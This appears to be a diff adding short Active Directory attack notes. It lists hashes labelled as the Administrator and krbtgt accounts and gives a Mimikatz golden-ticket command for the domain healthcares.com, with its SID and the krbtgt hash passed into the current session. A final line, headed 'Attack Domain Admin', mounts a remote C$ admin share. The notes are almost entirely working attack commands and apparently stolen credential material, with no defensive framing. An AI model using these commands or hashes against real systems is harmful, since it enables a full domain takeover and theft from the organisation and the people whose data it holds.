@@ -1,0 +1,11 @@
+f804a04440f51e70096691744051005f : Administrator
+
+4d1ae7bca3b292fd81f4e6bdd0e70ed7 : Krbtgt
+
+this correct:
+
+kerberos::golden /domain:healthcares.com /sid:S-1-5-21-1042125522-4064490761-1662264105 /user:Administrator /krbtgt:4d1ae7bca3b292fd81f4e6bdd0e70ed7 /ptt
+
+Attack Domain Admin:
+
+net use O: \\192.168.x.x\C$
